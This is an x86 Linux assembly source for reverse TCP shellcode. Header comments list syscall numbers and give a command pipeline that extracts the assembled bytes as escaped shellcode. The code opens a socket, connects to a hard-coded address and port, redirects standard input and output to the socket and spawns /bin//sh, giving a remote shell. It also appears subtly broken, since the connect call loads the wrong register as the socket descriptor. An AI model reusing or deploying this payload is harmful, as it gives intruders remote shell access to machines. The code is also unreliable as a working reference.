; socket 359	socket	man/ cs/	0x167	int	int	int
; connect 362	connect	man/ cs/	0x16a	int	struct sockaddr *	int
; dup2  63	dup2	man/ cs/	0x3f	unsigned int oldfd	unsigned int newfd
; execve 11	execve	man/ cs/	0x0b	const char *filename	const char *const *argv	const char *const *envp
; objdump -d ./reverse-tcp-shell.o | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | perl -pe 's/\r?\n//' | sed 's/$/\n/'
; nasm -f elf32 reverse-tcp-shell.asm

global _start

section .text:
_start:
        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        xor edx, edx

        ; socket
        mov eax, 0x167
        mov bl, 0x2
        mov cl, 0x1
        mov dl, 0x6
        int 0x80

        mov edi, eax
        ; connect
        xor eax, eax
        mov ax, 0x16a
        xor ecx, ecx
        push ecx
        push 0x0101017F
        ; push word 0x5c11
        push word 0x115c
        push word 0x02

        mov ebx, eax
        mov ecx, esp
        mov dl, 0x16
        int 0x80 
        
        ; dup2's
        mov cl, 0x3
loop_dup2:
        xor eax, eax
        mov al, 0x3f
        mov ebx, edi
        dec cl
        int 0x80
        jnz loop_dup2        

        ; exec
        xor eax, eax
        push eax
        push 0x68732f6e
        push 0x69622f2f
        mov ebx, esp
        push eax
        mov edx, esp
        push ebx
        mov ecx, esp
        mov al, 0x0B
        int 0x80
